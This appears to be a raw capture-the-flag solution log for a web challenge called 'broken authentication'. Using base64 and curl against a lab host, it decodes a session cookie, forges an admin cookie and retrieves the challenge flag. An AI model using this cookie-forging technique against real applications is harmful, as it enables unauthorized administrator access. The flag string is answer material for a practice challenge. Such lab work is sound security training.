'''
#register a normal user "a", change the cookies to "admin"

echo eyJ1c2VybmFtZSI6ImEifQ==|base64 -d
{"username":"a"}

echo {\"username\":\"admin\"}
{"username":"admin"}

echo -n {\"username\":\"admin\"}
{"username":"admin"}echo -n {\"username\":\"admin\"}|base64
eyJ1c2VybmFtZSI6ImFkbWluIn0=

echo eyJ1c2VybmFtZSI6ImFkbWluIn0=|base64 -d
{"username":"admin"}

curl -c cookies.txt -X POST -d "username=a&password=a" http://83.136.253.251:49614/auth/login
curl -b cookies.txt http://83.136.253.251:49614

<!DOCTYPE html>
<html lang="en">
<head>
        <title>broken authentication</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
        <link rel="icon" type="image/png" href="/static/images/icons/favicon.ico"/>
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/animate/animate.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/select2/select2.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/css/util.css">
        <link rel="stylesheet" type="text/css" href="/static/css/main.css">
<!--===============================================================================================-->
</head>
<body>

        <div class="limiter">
                <div class="container-login100" style="color:white;">
                                                <h1>You are not an admin</h1>
                                        </div>
        </div>




<!--===============================================================================================-->
        <script src="/static/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
        <script src="/static/vendor/bootstrap/js/popper.js"></script>
        <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
        <script src="/static/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
        <script src="/static/vendor/tilt/tilt.jquery.min.js"></script>
        <script >
                $('.js-tilt').tilt({
                        scale: 1.1
                })
        </script>
<!--===============================================================================================-->
        <script src="/static/js/main.js"></script>

</body>
</html>

#edit cookies.txt, replace the sessionid with new base64 code

curl -b cookies.txt http://83.136.253.251:49614

<!DOCTYPE html>
<html lang="en">
<head>
        <title>broken authentication</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
        <link rel="icon" type="image/png" href="/static/images/icons/favicon.ico"/>
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/animate/animate.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/vendor/select2/select2.min.css">
<!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="/static/css/util.css">
        <link rel="stylesheet" type="text/css" href="/static/css/main.css">
<!--===============================================================================================-->
</head>
<body>

        <div class="limiter">
                <div class="container-login100" style="color:white;">
                                                <h1>HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}</h1>
                                        </div>
        </div>




<!--===============================================================================================-->
        <script src="/static/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
        <script src="/static/vendor/bootstrap/js/popper.js"></script>
        <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
        <script src="/static/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
        <script src="/static/vendor/tilt/tilt.jquery.min.js"></script>
        <script >
                $('.js-tilt').tilt({
                        scale: 1.1
                })
        </script>
<!--===============================================================================================-->
        <script src="/static/js/main.js"></script>

</body>
</html>

'''
